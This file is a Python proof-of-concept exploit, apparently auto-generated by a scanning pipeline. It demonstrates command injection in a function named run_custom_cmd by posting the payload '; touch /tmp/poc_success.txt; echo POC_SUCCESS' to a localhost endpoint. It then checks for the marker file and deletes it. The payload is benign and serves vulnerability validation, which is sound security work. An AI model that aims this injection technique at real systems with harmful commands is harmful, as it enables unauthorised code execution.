#!/usr/bin/env python3
# PoC for phase0_test_6ug9osf0 (/tmp/phase0_test_6ug9osf0)
# Path: rce-001
# Sink: run_custom_cmd
# Auto-generated — run with: python3 rce_sink_function_run_custom_run_custom_cmd.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for phase0_test_6ug9osf0
Vulnerability: Remote Code Execution via Command Injection
Target: /tmp/phase0_test_6ug9osf0 (simulated web endpoint)

The vulnerable function `run_custom_cmd` passes user input directly to
subprocess.check_output(cmd, shell=True) without sanitization, allowing
arbitrary shell command injection.
"""

import requests
import sys
import time

# Configuration - modify these as needed
TARGET_URL = "http://localhost:8080/api/v1/trigger"  # Default target
TIMEOUT = 10  # Request timeout in seconds

# Benign payload that creates a marker file to confirm RCE
# Using 'touch' command which is available on most Unix systems
BENIGN_PAYLOAD = "; touch /tmp/poc_success.txt; echo POC_SUCCESS"

def exploit_rce(target_url, payload):
    """
    Send a malicious payload to the vulnerable endpoint.
    
    The payload is injected into the 'untrusted_user_input' parameter
    which flows directly into subprocess.check_output(cmd, shell=True).
    
    Args:
        target_url: The full URL of the vulnerable endpoint
        payload: Shell commands to execute (with injection prefix)
    
    Returns:
        Response text if successful, None otherwise
    """
    try:
        print(f"[*] Sending exploit to {target_url}")
        print(f"[*] Payload: {payload}")
        
        # Send POST request with the malicious input
        response = requests.post(
            target_url,
            json={"untrusted_user_input": payload},
            timeout=TIMEOUT
        )
        
        print(f"[*] HTTP Status: {response.status_code}")
        print(f"[*] Response: {response.text[:500]}")  # Truncate long responses
        
        return response.text
        
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed - is the target server running?")
        print("[-] Make sure the simulated endpoint is active")
        return None
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None

def verify_exploit():
    """
    Verify that the exploit worked by checking if the marker file exists.
    This is a simple check - in a real scenario you'd use a more robust method.
    """
    import os
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS: Marker file {marker_file} was created!")
        print("[+] Remote Code Execution confirmed!")
        # Clean up the marker file
        try:
            os.remove(marker_file)
            print("[*] Cleaned up marker file")
        except:
            pass
        return True
    else:
        print("[-] Marker file not found - exploit may have failed")
        return False

def main():
    """Main execution function"""
    print("=" * 60)
    print("PoC Exploit: phase0_test_6ug9osf0 - Command Injection")
    print("=" * 60)
    print()
    
    # Use command-line argument if provided, otherwise use default
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    
    print(f"[*] Target: {target}")
    print(f"[*] Using benign payload: {BENIGN_PAYLOAD}")
    print()
    
    # Execute the exploit
    result = exploit_rce(target, BENIGN_PAYLOAD)
    
    if result:
        print()
        print("[*] Checking if exploit was successful...")
        time.sleep(1)  # Give the system time to create the file
        verify_exploit()
    else:
        print("[-] Exploit execution failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
